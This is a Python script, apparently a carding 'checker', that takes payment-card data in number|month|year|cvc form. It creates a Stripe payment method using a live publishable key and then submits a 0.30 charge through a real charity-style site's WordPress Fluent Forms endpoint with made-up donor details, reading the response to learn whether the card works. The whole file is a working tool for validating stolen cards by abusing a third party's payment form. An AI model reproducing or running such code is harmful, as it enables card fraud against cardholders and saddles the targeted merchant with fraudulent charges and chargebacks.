import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56f7e9b608%3B+stripe-js-v3%2F56f7e9b608%3B+card-element&key=pk_live_51LanGBHHjRYUkug8BQqvlVSdf7vdZIRWepkjodjgBAC57T4A3ue6rit5IUedNaWemGOtJMQB2QkxmLXdLNuyFejB00xn7xun7G'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_pk_ref.1.9b2a': '%5B%22%22%2C%22%22%2C1742973431%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
	    '_pk_id.1.9b2a': '03b4d2fb9b82ef17.1742973431.',
	    '_pk_ses.1.9b2a': '1',
	    '__stripe_mid': 'b32ff061-b929-4a66-8593-f9ce83e4e3f8d79e5b',
	    '__stripe_sid': 'c9ed159a-9a6c-42f4-ac31-286d88badd0ee98ebf',
	    'cookie_notice_accepted': 'true',
	}
	
	headers = {
	    'authority': 'jayanti.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_pk_ref.1.9b2a=%5B%22%22%2C%22%22%2C1742973431%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.1.9b2a=03b4d2fb9b82ef17.1742973431.; _pk_ses.1.9b2a=1; __stripe_mid=b32ff061-b929-4a66-8593-f9ce83e4e3f8d79e5b; __stripe_sid=c9ed159a-9a6c-42f4-ac31-286d88badd0ee98ebf; cookie_notice_accepted=true',
	    'origin': 'https://jayanti.co.uk',
	    'referer': 'https://jayanti.co.uk/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1742973514789',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=13&_fluentform_6_fluentformnonce=327a5a42c6&_wp_http_referer=%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&input_text_2=0817480671&email=rodamuser20%40gmail.com&address1%5Baddress_line_1%5D=Street%2027&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=New%20York&address1%5Bstate%5D=New%20York&address1%5Bzip%5D=10080&address1%5Bcountry%5D=US&custom-payment-amount=0.30&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '6',
	}
	
	r2 = requests.post('https://jayanti.co.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
